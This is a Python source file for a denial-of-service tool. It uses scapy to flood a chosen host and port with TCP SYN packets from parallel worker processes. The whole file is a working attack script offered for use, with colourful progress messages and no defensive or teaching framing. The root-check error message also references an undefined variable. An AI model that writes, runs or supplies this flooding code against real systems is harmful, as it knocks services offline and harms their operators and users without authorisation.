#!/usr/bin/env python3.12
# _*_ coding: utf-8 _*_


from os import geteuid
from datetime import date
from optparse import OptionParser
from multiprocessing import Pool, cpu_count
from colorama import Fore, Back, Style
from scapy.all import IP, TCP, Raw, RandShort, send
from time import strftime, localtime, time

status_color = {
	'+': Fore.GREEN,
	'-': Fore.RED,
	'*': Fore.YELLOW,
	':': Fore.CYAN,
	' ': Fore.WHITE,
}

def get_time():
	return strftime("%H:%M:%S", localtime())
def display(status, data):
	print(f"{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {get_time()}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}")

def get_arguments(*args):
	parser = OptionParser()
	for arg in args:
		parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
	return parser.parse_args()[0]

def check_root():
	return geteuid() == 0

def syn_flood(thread_index, target, port, size):
	display(':', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Crafting IP Layer")
	ip_layer = IP(dst=target)
	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Done")
	display(':', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Crafting TCP Layer")
	if port != -1:
		tcp_layer = TCP(sport=RandShort(), dport=port, flags='S')
	else:
		tcp_layer = TCP(sport=RandShort(), flags='S')
	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Done")
	display(':', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Making RAW Data")
	raw_data = Raw(b'X'*size)
	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Done")
	display(':', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Crafting the Final Packet => {Back.MAGENTA}ip_layer / tcp_layer / raw_data{Back.RESET}")
	packet = ip_layer / tcp_layer / raw_data
	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Done")
	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Flooding Packets to target {Back.MAGENTA}{target}{Back.RESET}:{Back.MAGENTA}{port}{Back.RESET}")
	send(packet, loop=1, verbose=0)

if __name__ == "__main__":
	data = get_arguments(('-t', "--target", "target", "Target to perform SYN Flooding Attack on"),
		      			 ('-p', "--port", "port", "Target Port to flood"),
						 ('-s', "--size", "size", "Size of Data that we want to send(in Bytes) (Default=1024 Bytes)"))
	if not data.target:
		display('-', "Please specify a target")
		exit(0)
	if not data.port:
		data.port = -1
	else:
		try:
			data.port = int(data.port)
		except ValueError:
			display('-', "Please enter a valid port")
			exit(0)
	if not data.size:
		data.size = 1024
	else:
		data.size = int(data.size)
	if not check_root():
		display('-', f"This Program requires {thread_index} ")
		exit(0)
	thread_count = cpu_count()
	pool = Pool(thread_count)
	threads = []
	display('+', f"Starting SYN Flood Attack on {Back.MAGENTA}{data.target}{Back.RESET}:{Back.MAGENTA}{data.port}{Back.RESET} with {Back.MAGENTA}{thread_count}{Back.RESET}")
	for thread_index in range(thread_count):
		threads.append(pool.apply_async(syn_flood, (thread_index, data.target, data.port, data.size)))
	try:
		for thread in threads:
			thread.get()
		pool.close()
		pool.join()
	except KeyboardInterrupt:
		display(':', f"Closing")
		exit(0)
